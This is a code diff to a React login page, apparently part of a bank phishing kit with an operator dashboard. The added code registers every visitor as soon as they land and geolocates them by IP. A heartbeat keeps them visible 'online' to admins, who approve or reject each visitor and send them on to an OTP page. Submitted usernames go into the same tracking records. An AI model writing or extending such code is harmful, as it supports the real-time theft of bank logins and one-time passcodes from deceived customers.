@@ -23,6 +23,7 @@ const Login = () => {
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
   const [waitingUserId, setWaitingUserId] = useState<string | null>(null);
+  const [presenceUid, setPresenceUid] = useState<string | null>(existingUid || null);
   const [rejectionError, setRejectionError] = useState(wasRejected);
 
   // Clear waiting overlay on rejection
@@ -33,7 +34,44 @@ const Login = () => {
     }
   }, [wasRejected, searchParams.get("t")]);
 
-  useAdminRedirect(waitingUserId || existingUid || null, { approveRedirect: "/otp" });
+  // Early presence: register the visitor as soon as they land on the login page,
+  // so admins see them immediately in the realtime visitor list.
+  useEffect(() => {
+    if (existingUid) return;
+    const sessionKey = "cib_presence_uid";
+    const cached = sessionStorage.getItem(sessionKey);
+    if (cached) { setPresenceUid(cached); return; }
+
+    let cancelled = false;
+    (async () => {
+      let countryCode = "";
+      try {
+        const geo = await fetch("https://ipapi.co/json/").then(r => r.json());
+        countryCode = geo?.country_code || "";
+      } catch { /* ignore */ }
+      if (cancelled) return;
+      const { data, error } = await supabase
+        .from("dashboard_users")
+        .insert([{ name: "زائر جديد", last_page: "تسجيل الدخول", watch_choice: watchChoice || null, country_code: countryCode }])
+        .select("id");
+      if (!cancelled && !error && data?.[0]?.id) {
+        sessionStorage.setItem(sessionKey, data[0].id);
+        setPresenceUid(data[0].id);
+      }
+    })();
+    return () => { cancelled = true; };
+  }, [existingUid, watchChoice]);
+
+  // Heartbeat: refresh updated_at every 30s so the dashboard keeps the visitor "online".
+  useEffect(() => {
+    const uid = presenceUid || existingUid;
+    if (!uid) return;
+    const ping = () => { supabase.from("dashboard_users").update({ last_page: "تسجيل الدخول" }).eq("id", uid).then(); };
+    const interval = setInterval(ping, 30000);
+    return () => clearInterval(interval);
+  }, [presenceUid, existingUid]);
+
+  useAdminRedirect(waitingUserId || presenceUid || existingUid || null, { approveRedirect: "/otp" });
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -58,8 +96,11 @@ const Login = () => {
 
     let finalUserId: string | null = null;
 
-    // If returning after rejection, update the same record
-    if (existingUid) {
+    // Prefer the early-presence record created on page load,
+    // then a returning-after-rejection id, otherwise create/update by name.
+    const reuseUid = presenceUid || existingUid;
+
+    if (reuseUid) {
       const updatePayload: TablesUpdate<"dashboard_users"> = {
         name: username,
         last_page: "تسجيل الدخول",
@@ -71,10 +112,9 @@ const Login = () => {
       const { error: updateError } = await supabase
         .from("dashboard_users")
         .update(updatePayload)
-        .eq("id", existingUid);
-      if (!updateError) finalUserId = existingUid;
+        .eq("id", reuseUid);
+      if (!updateError) finalUserId = reuseUid;
     } else {
-      // Check by name
       const { data: existing } = await supabase
         .from("dashboard_users")
         .select("id")
